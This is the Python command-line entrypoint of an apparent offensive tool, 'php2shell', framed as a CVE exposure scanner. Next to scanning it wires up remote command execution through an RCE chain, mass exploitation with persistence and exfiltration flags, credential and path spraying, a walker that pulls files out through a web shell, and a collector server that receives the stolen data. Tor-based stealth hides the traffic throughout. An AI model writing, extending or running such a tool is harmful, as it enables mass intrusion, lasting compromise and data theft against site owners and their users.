# Python 3.11 · CLI entrypoint
from __future__ import annotations

import asyncio
import json
from pathlib import Path

import typer
from rich.console import Console
from rich.progress import Progress

from .scanner import Scanner
from .report import write_html
from .stealth import Stealth

app = typer.Typer(help="php2shell — CVE-2026-109618 / -109619 exposure scanner")
console = Console()


def _read(p: Path) -> list[str]:
    return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]


def _require_extra(name: str) -> None:
    try:
        __import__(f"php2shell.optional.{name}")
    except Exception:
        console.print(
            f"[red]missing extra[/] '{name}' — install with:\n"
            f"  bash install.sh --full\n"
            f"  or: pip install -r requirements-extras.txt"
        )
        raise typer.Exit(code=2)


@app.command()
def scan(
    targets: Path = typer.Argument(..., help="file with one URL per line"),
    safe: bool = typer.Option(True),
    tor: bool = typer.Option(False),
    out: Path = typer.Option(Path("./reports")),
    concurrency: int = typer.Option(20),
):
    urls = _read(targets)
    console.print(f"[bold]scan[/] {len(urls)} target(s) safe={safe} tor={tor}")
    scanner = Scanner(safe=safe, concurrency=concurrency, stealth=Stealth(tor=tor))

    async def run():
        results = []
        with Progress() as p:
            task = p.add_task("scan", total=len(urls))
            for i in range(0, len(urls), 50):
                chunk = urls[i:i + 50]
                results.extend(await scanner.scan(chunk))
                p.update(task, advance=len(chunk))
        return results

    results = asyncio.run(run())
    out.mkdir(parents=True, exist_ok=True)
    html_path = out / "report.html"
    write_html(results, html_path)
    confident = [r for r in results if r.confident]
    console.print(f"[green]report[/]: {html_path}")
    console.print(f"[yellow]confident hits[/]: {len(confident)}")
    for r in confident[:10]:
        console.print(f"  {r.url}  {','.join(r.confident)}  php={r.php_version}")


@app.command()
def verify(url: str, safe: bool = typer.Option(True)):
    scanner = Scanner(safe=safe)
    result = asyncio.run(scanner.scan([url]))[0]
    console.print_json(json.dumps(result.__dict__, default=str))


@app.command()
def exploit(url: str, cmd: str = typer.Argument("id")):
    from .exploit.gate import require_authorization
    from .exploit.rce import RCEChain
    require_authorization(url)

    async def run():
        async with Stealth().client() as c:
            ok, out = await RCEChain(c, url).execute(cmd)
            return ok, out

    ok, out = asyncio.run(run())
    console.print(("OK" if ok else "FAIL") + ": " + out)


@app.command()
def mass(
    targets: Path = typer.Argument(...),
    persist: bool = typer.Option(False),
    exfil: bool = typer.Option(False),
    tor: bool = typer.Option(False),
):
    _require_extra("mass")
    from .optional.mass.orchestrator import Orchestrator, MassConfig
    urls = _read(targets)
    cfg = MassConfig(targets=urls, persist=persist, exfil=exfil, stealth=Stealth(tor=tor))
    tally = asyncio.run(Orchestrator(cfg).run())
    console.print_json(json.dumps(tally))


@app.command()
def spray(
    targets: Path = typer.Argument(...),
    kind: str = typer.Option("creds", help="creds|paths"),
    user: str = typer.Option(None),
    password: str = typer.Option(None),
    paths_file: Path = typer.Option(None),
    tor: bool = typer.Option(False),
):
    _require_extra("mass")
    from .optional.mass.spray import spray_creds, spray_paths, SprayConfig
    urls = _read(targets)
    cfg = SprayConfig(targets=urls, stealth=Stealth(tor=tor))
    if kind == "creds":
        hits = asyncio.run(spray_creds(cfg, user, password))
    else:
        paths = _read(paths_file)
        hits = asyncio.run(spray_paths(cfg, paths))
    for h in hits:
        console.print(h)


@app.command("exfil")
def exfil_cmd(shell_url: str, out_dir: Path = typer.Option(Path("./exfil"))):
    _require_extra("exfil")
    from .optional.exfil.walker import walk_and_ship
    from .stealth import Stealth

    async def run():
        c = Stealth().client()
        try:
            return await walk_and_ship(c, shell_url, out_dir)
        finally:
            await c.aclose()

    shipped = asyncio.run(run())
    console.print(f"[green]shipped[/]: {len(shipped)} file(s)")


@app.command()
def collector(port: int = typer.Option(8443), out: Path = typer.Option(Path("./collector"))):
    _require_extra("exfil")
    import uvicorn
    out.mkdir(parents=True, exist_ok=True)
    console.print(f"[bold]collector[/] 0.0.0.0:{port}  →  {out}")
    uvicorn.run("php2shell.optional.exfil.collector:app", host="0.0.0.0", port=port)


if __name__ == "__main__":
    app()